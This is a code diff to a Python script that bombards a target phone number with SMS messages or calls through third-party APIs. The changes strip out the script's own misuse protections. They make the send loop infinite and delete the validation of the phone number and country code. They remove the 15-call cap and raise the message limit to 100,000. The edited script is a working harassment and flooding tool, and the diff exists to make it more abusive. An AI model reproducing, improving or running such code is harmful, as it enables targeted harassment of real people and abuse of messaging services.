@@ -701,7 +701,7 @@ def start(target, counter, delay, ch, cc):
     requested = 0
     success = int(requested) - int(failed)
     bombs = int(counter) + 1
-    while success < (int(bombs)):
+    while True:
         os.system('clear')
         banner()
         try:
@@ -751,9 +751,8 @@ def start(target, counter, delay, ch, cc):
             success = success + 1
         else:
             failed = failed + 1
-            while ch.count(api) > 0:
-                ch.remove(api)
-        time.sleep(float(delay))
+            
+        time.sleep(5)
         if requested % 3 == 0:
             checkinternet()
     print(W)
@@ -809,7 +808,7 @@ except Exception:
     pass
 while True:
     pn = ""
-    cc = input("\tEnter Your Country Code (Without +) : ")
+    cc = 91
     if '+' in cc:
         tc = list(cc)
         tc.remove('+')
@@ -817,12 +816,7 @@ while True:
         cc = cc.strip()
     pn = input("\tEnter Target Number: +" + cc + " ")
     pn = remsp(pn)
-    if len(cc) >= 4 or len(cc) < 1:
-        print('\n\nInvalid Country Code..\n\t\tCountry Codes Are Generally 1-3 digits...\n')
-        continue
-    if len(pn) <= 6:
-        print('\n\nInvalid Phone Number..\n')
-        continue
+    
     for cch in str(cc + pn):
         if not cch.isdigit():
             print('\n\nPhone Number Must Consist Of Numbers Only\n')
@@ -836,25 +830,15 @@ except Exception:
     type = 0
 if type == 1:
     nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
-    if nm > 15:
-        print("\t\tYou Have Entered " + str(nm) +
-              ".\n\tNormalizing Value To 15")
-        nm = 15
+    
     dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
 elif type == 0:
-    if cc == "91":
         nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))
         dl = float(
             input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
-    else:
-        nm = int(input("Enter Number of Messages To Send: "))
-        dl = float(
-            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
-maxlim = 0
-if cc == "91":
-    maxlim = 500
-else:
-    maxlim = 100
+    
+maxlim = 100000
+
 if nm > maxlim:
     print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
           str(maxlim) + ' SMS At Once...\n\n')
